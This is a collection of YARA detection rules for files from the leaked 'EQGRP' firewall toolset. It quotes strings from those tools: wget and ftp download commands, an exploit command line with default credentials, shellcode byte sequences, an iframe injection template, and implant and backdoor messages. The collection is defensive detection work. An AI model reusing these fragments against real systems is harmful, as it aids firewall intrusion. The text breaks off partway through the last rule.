  "EQGRP_workit": "rule EQGRP_workit \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file workit.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"fb533b4d255b4e6072a4fa2e1794e38a165f9aa66033340c2f4f8fd1da155fac\"\n\n    strings:\n        $s1 = \"macdef init > /tmp/.netrc;\" fullword ascii\n        $s2 = \"/usr/bin/wget http://\" fullword ascii\n        $s3 = \"HOME=/tmp ftp\" fullword ascii\n        $s4 = \" >> /tmp/.netrc;\" fullword ascii\n        $s5 = \"/usr/rapidstream/bin/tftp\" fullword ascii\n        $s6 = \"created shell_command:\" fullword ascii\n        $s7 = \"rm -f /tmp/.netrc;\" fullword ascii\n        $s8 = \"echo quit >> /tmp/.netrc;\" fullword ascii\n        $s9 = \"echo binary >> /tmp/.netrc;\" fullword ascii\n        $s10 = \"chmod 600 /tmp/.netrc;\" fullword ascii\n        $s11 = \"created cli_command:\" fullword ascii\n   \n    condition:\n        6 of them\n}",
  "EQGRP_tinyhttp_setup": "rule EQGRP_tinyhttp_setup \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file tinyhttp_setup.sh\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"3d12c83067a9f40f2f5558d3cf3434bbc9a4c3bb9d66d0e3c0b09b9841c766a0\"\n    \n    strings:\n        $x1 = \"firefox http://127.0.0.1:8000/$_name\" fullword ascii\n        $x2 = \"What is the name of your implant:\" fullword ascii /* it's called conscience */\n        $x3 = \"killall thttpd\" fullword ascii\n        $x4 = \"copy http://<IP>:80/$_name flash:/$_name\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x2123 and filesize < 2KB and 1 of ($x*) ) or ( all of them )\n}",
  "EQGRP_shellcode": "rule EQGRP_shellcode \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file shellcode.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"ac9decb971dd44127a6ca0d35ac153951f0735bb4df422733046098eca8f8b7f\"\n\n    strings:\n        $s1 = \"execute_post = '\\\\xe8\\\\x00\\\\x00\\\\x00\\\\x00\\\\x5d\\\\xbe\\\\xef\\\\xbe\\\\xad\\\\xde\\\\x89\\\\xf7\\\\x89\\\\xec\\\\x29\\\\xf4\\\\xb8\\\\x03\\\\x00\\\\x00\\\\x00\" ascii\n        $s2 = \"tiny_exec = '\\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x01\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x03\\\\x00\\\\x01\\\\x00\\\\x00\" ascii\n        $s3 = \"auth_id = '\\\\x31\\\\xc0\\\\xb0\\\\x03\\\\x31\\\\xdb\\\\x89\\\\xe1\\\\x31\\\\xd2\\\\xb6\\\\xf0\\\\xb2\\\\x0d\\\\xcd\\\\x80\\\\x3d\\\\xff\\\\xff\\\\xff\\\\xff\\\\x75\\\\x07\" ascii\n\n        $c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 }\n        /* $c2 = { 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 02 00 03 00 01 00 00 }  too many fps */\n        $c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 }\n\n    condition:\n        1 of them\n}",
  "EQGRP_EPBA": "rule EQGRP_EPBA \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file EPBA.script\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"53e1af1b410ace0934c152b5df717d8a5a8f5fdd8b9eb329a44d94c39b066ff7\"\n\n    strings:\n        $x1 = \"./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 \" fullword ascii\n        $x2 = \"-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP\" fullword ascii\n        $x3 = \"./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP\" fullword ascii\n        $x4 = \"--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)\" fullword ascii\n        $x5 = \"-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port\" fullword ascii\n        $x6 = \"this operation is complete, BananaGlee will\" fullword ascii\n        $x7 = \"cd /current/bin/FW/BGXXXX/Install/LP\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x2023 and filesize < 7KB and 1 of ($x*) ) or ( 3 of them )\n}",
  "EQGRP_BPIE": "rule EQGRP_BPIE \n{\n    meta:\n        description = \"EQGRP Toolset Firewall - file BPIE-2201.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"697e80cf2595c85f7c931693946d295994c55da17a400f2c9674014f130b4688\"\n\n    strings:\n        $s1 = \"profProcessPacket\" fullword ascii\n        $s2 = \".got_loader\" fullword ascii\n        $s3 = \"getTimeSlotCmdHandler\" fullword ascii\n        $s4 = \"getIpIpCmdHandler\" fullword ascii\n        $s5 = \"LOADED\" fullword ascii\n        $s6 = \"profStartScan\" fullword ascii\n        $s7 = \"tmpData.1\" fullword ascii\n        $s8 = \"resetCmdHandler\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 70KB and 6 of ($s*) )\n}",
  "EQGRP_jetplow_SH": "rule EQGRP_jetplow_SH \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file jetplow.sh\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"ee266f84a1a4ccf2e789a73b0a11242223ed6eba6868875b5922aea931a2199c\"\n\n    strings:\n        $s1 = \"cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow\" fullword ascii\n        $s2 = \"***** Please place your UA in /current/bin/FW/OPS *****\" fullword ascii\n        $s3 = \"ln -s ../jp/orig_code.bin orig_code_pixGen.bin\" fullword ascii\n        $s4 = \"*****             Welcome to JetPlow              *****\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_BBANJO": "rule EQGRP_BBANJO \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BBANJO-3011.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"f09c2f90464781a08436321f6549d350ecef3d92b4f25b95518760f5d4c9b2c3\"\n\n    strings:\n        $s1 = \"get_lsl_interfaces\" fullword ascii\n        $s2 = \"encryptFC4Payload\" fullword ascii\n        $s3 = \".got_loader\" fullword ascii\n        $s4 = \"beacon_getconfig\" fullword ascii\n        $s5 = \"LOADED\" fullword ascii\n        $s6 = \"FormBeaconPacket\" fullword ascii\n        $s7 = \"beacon_reconfigure\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 50KB and all of them )\n}",
  "EQGRP_BPATROL_2201": "rule EQGRP_BPATROL_2201 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BPATROL-2201.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"aa892750b893033eed2fedb2f4d872f79421174eb217f0c34a933c424ae66395\"\n\n    strings:\n        $s1 = \"dumpConfig\" fullword ascii\n        $s2 = \"getstatusHandler\" fullword ascii\n        $s3 = \".got_loader\" fullword ascii\n        $s4 = \"xtractdata\" fullword ascii\n        $s5 = \"KEEPGOING\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 40KB and all of them )\n}",
  "EQGRP_extrabacon": "rule EQGRP_extrabacon \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"59d60835fe200515ece36a6e87e642ee8059a40cb04ba5f4b9cce7374a3e7735\"\n\n    strings:\n        $x1 = \"To disable password checking on target:\" fullword ascii\n        $x2 = \"[-] target is running\" fullword ascii\n        $x3 = \"[-] problem importing version-specific shellcode from\" fullword ascii\n        $x4 = \"[+] importing version-specific shellcode\" fullword ascii\n        $s5 = \"[-] unsupported target version, abort\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_sploit_py": "rule EQGRP_sploit_py \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file sploit.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6\"\n\n    strings:\n        $x1 = \"the --spoof option requires 3 or 4 fields as follows redir_ip\" ascii\n        $x2 = \"[-] timeout waiting for response - target may have crashed\" fullword ascii\n        $x3 = \"[-] no response from health check - target may have crashed\" fullword ascii\n    \n    condition:\n        1 of them\n}",
  "EQGRP_uninstallPBD": "rule EQGRP_uninstallPBD \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file uninstallPBD.bat\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"692fdb449f10057a114cf2963000f52ce118d9a40682194838006c66af159bd0\"\n\n    strings:\n        $s1 = \"memset 00e9a05c 4 38845b88\" fullword ascii\n        $s2 = \"_hidecmd\" fullword ascii\n        $s3 = \"memset 013abd04 1 0d\" fullword ascii\n    \n    condition:\n        all of them\n}",
  "EQGRP_BICECREAM": "rule EQGRP_BICECREAM \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BICECREAM-2140\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"4842076af9ba49e6dfae21cf39847b4172c06a0bd3d2f1ca6f30622e14b77210\"\n\n    strings:\n        $s1 = \"Could not connect to target device: %s:%d. Please check IP address.\" fullword ascii\n        $s2 = \"command data size is invalid for an exec cmd\" fullword ascii\n        $s3 = \"A script was specified but target is not a PPC405-based NetScreen (NS5XT, NS25, and NS50). Executing scripts is supported but ma\" ascii\n        $s4 = \"Execute 0x%08x with args (%08x, %08x, %08x, %08x): [y/n]\" fullword ascii\n        $s5 = \"Execute 0x%08x with args (%08x, %08x, %08x): [y/n]\" fullword ascii\n        $s6 = \"[%d] Execute code.\" fullword ascii\n        $s7 = \"Execute 0x%08x with args (%08x): [y/n]\" fullword ascii\n        $s8 = \"dump_value_LHASH_DOALL_ARG\" fullword ascii\n        $s9 = \"Eggcode is complete. Pass execution to it? [y/n]\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x457f and filesize < 5000KB and 2 of them ) or ( 5 of them )\n}",
  "EQGRP_create_http_injection": "rule EQGRP_create_http_injection \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file create_http_injection.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"de52f5621b4f3896d4bd1fb93ee8be827e71a2b189a9f8552b68baed062a992d\"\n\n    strings:\n        $x1 = \"required by SECONDDATE\" fullword ascii\n        $s1 = \"help='Output file name (optional). By default the resulting data is written to stdout.')\" fullword ascii\n        $s2 = \"data = '<html><body onload=\\\"location.reload(true)\\\"><iframe src=\\\"%s\\\" height=\\\"1\\\" width=\\\"1\\\" scrolling=\\\"no\\\" frameborder=\\\"\" ascii\n        $s3 = \"version='%prog 1.0',\" fullword ascii\n        $s4 = \"usage='%prog [ ... options ... ] url',\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x2123 and filesize < 3KB and ( $x1 or 2 of them ) ) or ( all of them )\n}",
  "EQGRP_BFLEA_2201": "rule EQGRP_BFLEA_2201 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BFLEA-2201.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"15e8c743770e44314496c5f27b6297c5d7a4af09404c4aa507757e0cc8edc79e\"\n\n    strings:\n        $s1 = \".got_loader\" fullword ascii\n        $s2 = \"LOADED\" fullword ascii\n        $s3 = \"readFlashHandler\" fullword ascii\n        $s4 = \"KEEPGOING\" fullword ascii\n        $s5 = \"flashRtnsPix6x.c\" fullword ascii\n        $s6 = \"fix_ip_cksum_incr\" fullword ascii\n        $s7 = \"writeFlashHandler\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 30KB and 5 of them ) or ( all of them )\n}",
  "EQGRP_BpfCreator_RHEL4": "rule EQGRP_BpfCreator_RHEL4 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BpfCreator-RHEL4\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"bd7303393409623cabf0fcf2127a0b81fae52fe40a0d2b8db0f9f092902bbd92\"\n\n    strings:\n        $s1 = \"usage %s \\\"<tcpdump pcap string>\\\" <outfile>\" fullword ascii\n        $s2 = \"error reading dump file: %s\" fullword ascii\n        $s3 = \"truncated dump file; tried to read %u captured bytes, only got %lu\" fullword ascii\n        $s4 = \"%s: link-layer type %d isn't supported in savefiles\" fullword ascii\n        $s5 = \"DLT %d is not one of the DLTs supported by this device\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 2000KB and all of them )\n}",
  "EQGRP_StoreFc": "rule EQGRP_StoreFc \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file StoreFc.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"f155cce4eecff8598243a721389046ae2b6ca8ba6cb7b4ac00fd724601a56108\"\n\n    strings:\n        $x1 = \"Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf\" ascii\n        $x2 = \"raise Exception, \\\"Must supply both a config file and implant file.\\\"\" fullword ascii\n        $x3 = \"This is wrapper for Store.py that FELONYCROWBAR will use. This\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_hexdump": "rule EQGRP_hexdump \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file hexdump.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"95a9a6a8de60d3215c1c9f82d2d8b2640b42f5cabdc8b50bd1f4be2ea9d7575a\"\n\n    strings:\n        $s1 = \"def hexdump(x,lead=\\\"[+] \\\",out=sys.stdout):\" fullword ascii\n        $s2 = \"print >>out, \\\"%s%04x  \\\" % (lead,i),\" fullword ascii\n        $s3 = \"print >>out, \\\"%02X\\\" % ord(x[i+j]),\" fullword ascii\n        $s4 = \"print >>out, sane(x[i:i+16])\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x2123 and filesize < 1KB and 2 of ($s*) ) or ( all of them )\n}",
  "EQGRP_BBALL": "rule EQGRP_BBALL \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BBALL_E28F6-2201.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"498fc9f20b938b8111adfa3ca215325f265a08092eefd5300c4168876deb7bf6\"\n\n    strings:\n        $s1 = \"Components/Modules/BiosModule/Implant/E28F6/../e28f640j3_asm.S\" fullword ascii\n        $s2 = \".got_loader\" fullword ascii\n        $s3 = \"handler_readBIOS\" fullword ascii\n        $s4 = \"cmosReadByte\" fullword ascii\n        $s5 = \"KEEPGOING\" fullword ascii\n        $s6 = \"checksumAreaConfirmed.0\" fullword ascii\n        $s7 = \"writeSpeedPlow.c\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 40KB and 4 of ($s*) ) or ( all of them )\n}",
  "EQGRP_BARPUNCH_BPICKER": "rule EQGRP_BARPUNCH_BPICKER \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n        hash2 = \"d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f\"\n\n    strings:\n        $x1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u\" fullword ascii\n        $x2 = \"%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]\" fullword ascii\n        $x3 = \"* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)\" fullword ascii\n        $x4 = \"%s version %s already has persistence installed. If you want to uninstall,\" fullword ascii\n        $x5 = \"The active module(s) on the target are not meant to be persisted\" fullword ascii\n   \n    condition:\n        ( uint16(0) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )\n}",
  "EQGRP_Implants_Gen6": "rule EQGRP_Implants_Gen6 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n        hash2 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash3 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n        hash4 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n        hash5 = \"6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3\"\n        hash6 = \"d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f\"\n        hash7 = \"464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c\"\n\n    strings:\n        $s1 = \"LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information\" fullword ascii\n        $s2 = \"LP.c:pixSecurity - Not in Session\" fullword ascii\n        $s3 = \"getModInterface__preloadedModules\" fullword ascii\n        $s4 = \"showCommands\" fullword ascii\n        $s5 = \"readModuleInterface\" fullword ascii\n        $s6 = \"Wrapping_Not_Necessary_Or_Wrapping_Ok\" fullword ascii\n        $s7 = \"Get_CMD_List\" fullword ascii\n        $s8 = \"LP_Listen2\" fullword ascii\n        $s9 = \"killCmdList\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 6000KB and all of them )\n}",
  "EQGRP_Implants_Gen5": "rule EQGRP_Implants_Gen5 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n        hash2 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n        hash3 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash4 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n        hash5 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n        hash6 = \"6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3\"\n        hash7 = \"d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f\"\n        hash8 = \"464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c\"\n   \n    strings:\n        $x1 = \"Module and Implant versions do not match.  This module is not compatible with the target implant\" fullword ascii\n        $s1 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log\" fullword ascii\n        $s2 = \"%s/BF_%04d%02d%02d.log\" fullword ascii\n        $s3 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x457f and 1 of ($x*) ) or ( all of them )\n}",
  "EQGRP_pandarock": "rule EQGRP_pandarock \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files pandarock_v1.11.1.1.bin, pit\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"1214e282ac7258e616ebd76f912d4b2455d1b415b7216823caa3fc0d09045a5f\"\n        hash2 = \"c8a151df7605cb48feb8be2ab43ec965b561d2b6e2a837d645fdf6a6191ab5fe\"\n  \n    strings:\n        $x1 = \"* Not attempting to execute \\\"%s\\\" command\" fullword ascii\n        $x2 = \"TERMINATING SCRIPT (command error or \\\"quit\\\" encountered)\" fullword ascii\n        $x3 = \"execute code in <file> passing <argX> (HEX)\" fullword ascii\n        $x4 = \"* Use arrow keys to scroll through command history\" fullword ascii\n        $s1 = \"pitCmd_processCmdLine\" fullword ascii\n        $s2 = \"execute all commands in <file>\" fullword ascii\n        $s3 = \"__processShellCmd\" fullword ascii\n        $s4 = \"pitTarget_getDstPort\" fullword ascii\n        $s5 = \"__processSetTargetIp\" fullword ascii\n        $o1 = \"Logging commands and output - ON\" fullword ascii\n        $o2 = \"This command is too dangerous.  If you'd like to run it, contact the development team\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 3000KB and 1 of ($x*) ) or ( 4 of them ) or 1 of ($o*)\n}",
  "EQGRP_BananaUsurper_writeJetPlow": "rule EQGRP_BananaUsurper_writeJetPlow\n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n        hash2 = \"464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c\"\n \n    strings:\n        $x1 = \"Implant Version-Specific Values:\" fullword ascii\n        $x2 = \"This function should not be used with a Netscreen, something has gone horribly wrong\" fullword ascii\n        $s1 = \"createSendRecv: recv'd an error from the target.\" fullword ascii\n        $s2 = \"Error: WatchDogTimeout read returned %d instead of 4\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 2000KB and 1 of ($x*) ) or ( 3 of them )\n}",
  "EQGRP_Implants_Gen4": "rule EQGRP_Implants_Gen4 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash2 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n        hash3 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n        hash4 = \"6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3\"\n\n    strings:\n        $s1 = \"Command has not yet been coded\" fullword ascii\n        $s2 = \"Beacon Domain  : www.%s.com\" fullword ascii\n        $s3 = \"This command can only be run on a PIX/ASA\" fullword ascii\n        $s4 = \"Warning! Bad or missing Flash values (in section 2 of .dat file)\" fullword ascii\n        $s5 = \"Printing the interface info and security levels. PIX ONLY.\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )\n}",
  "EQGRP_Implants_Gen3": "rule EQGRP_Implants_Gen3 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc\"\n        hash2 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash3 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n        hash4 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n        hash5 = \"6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3\"\n        hash6 = \"d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f\"\n\n    strings:\n        $x1 = \"incomplete and must be removed manually.)\" fullword ascii\n        $s1 = \"%s: recv'd an error from the target.\" fullword ascii\n        $s2 = \"Unable to fetch the address to the get_uptime_secs function for this OS version\" fullword ascii\n        $s3 = \"upload/activate/de-activate/remove/cmd function failed\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )\n}",
  "EQGRP_BLIAR_BLIQUER": "rule EQGRP_BLIAR_BLIQUER \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash2 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n\n    strings:\n        $x1 = \"Do you wish to activate the implant that is already on the firewall? (y/n): \" fullword ascii\n        $x2 = \"There is no implant present on the firewall.\" fullword ascii\n        $x3 = \"Implant Version :%lx%lx%lx\" fullword ascii\n        $x4 = \"You may now connect to the implant using the pbd idkey\" fullword ascii\n        $x5 = \"No reply from persistant back door.\" fullword ascii\n        $x6 = \"rm -rf pbd.wc; wc -c %s > pbd.wc\" fullword ascii\n        $p1 = \"PBD_GetVersion\" fullword ascii\n        $p2 = \"pbd/pbdEncrypt.bin\" fullword ascii\n        $p3 = \"pbd/pbdGetVersion.pkt\" fullword ascii\n        $p4 = \"pbd/pbdStartWrite.bin\" fullword ascii\n        $p5 = \"pbd/pbd_setNewHookPt.pkt\" fullword ascii\n        $p6 = \"pbd/pbd_Upload_SinglePkt.pkt\" fullword ascii\n        $s1 = \"Unable to fetch hook and jmp addresses for this OS version\" fullword ascii\n        $s2 = \"Could not get hook and jump addresses\" fullword ascii\n        $s3 = \"Enter the name of a clean implant binary (NOT an image):\" fullword ascii\n        $s4 = \"Unable to read dat file for OS version 0x%08lx\" fullword ascii\n        $s5 = \"Invalid implant file\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 3000KB and ( 1 of ($x*) or 1 of ($p*) ) ) or ( 3 of them )\n}",
  "EQGRP_sploit": "rule EQGRP_sploit \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files sploit.py, sploit.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6\"\n        hash2 = \"0316d70a5bbf068a7fc791e08e816015d04ec98f088a7ff42af8b9e769b8d1f6\"\n\n    strings:\n        $s1 = \"print \\\"[+] Connecting to %s:%s\\\" % (self.params.dst['ip'], self.params.dst['port'])\" fullword ascii\n        $s2 = \"@overridable(\\\"Must be overriden if the target will be touched.  Base implementation should not be called.\\\")\" fullword ascii\n        $s3 = \"@overridable(\\\"Must be overriden.  Base implementation should not be called.\\\")\" fullword ascii\n        $s4 = \"exp.load_vinfo()\" fullword ascii\n        $s5 = \"if not okay and self.terminateFlingOnException:\" fullword ascii\n        $s6 = \"print \\\"[-] keyboard interrupt before response received\\\"\" fullword ascii\n        $s7 = \"if self.terminateFlingOnException:\" fullword ascii\n        $s8 = \"print 'Debug info ','='*40\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x2123 and filesize < 90KB and 1 of ($s*) ) or ( 4 of them )\n}",
  "EQGRP_Implants_Gen2": "rule EQGRP_Implants_Gen2 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        super_rule = 1\n        hash1 = \"3366b4bbf265716869a487203a8ac39867920880990493dd4dd8385e42b0c119\"\n        hash2 = \"05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4\"\n        hash3 = \"d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939\"\n        hash4 = \"8e4a76c4b50350b67cabbb2fed47d781ee52d8d21121647b0c0356498aeda2a2\"\n        hash5 = \"6059bec5cf297266079d52dbb29ab9b9e0b35ce43f718022b5b5f760c1976ec3\"\n        hash6 = \"464b4c01f93f31500d2d770360d23bdc37e5ad4885e274a629ea86b2accb7a5c\"\n    \n    strings:\n        $x1 = \"Modules persistence file written successfully\" fullword ascii\n        $x2 = \"Modules persistence data successfully removed\" fullword ascii\n        $x3 = \"No Modules are active on the firewall, nothing to persist\" 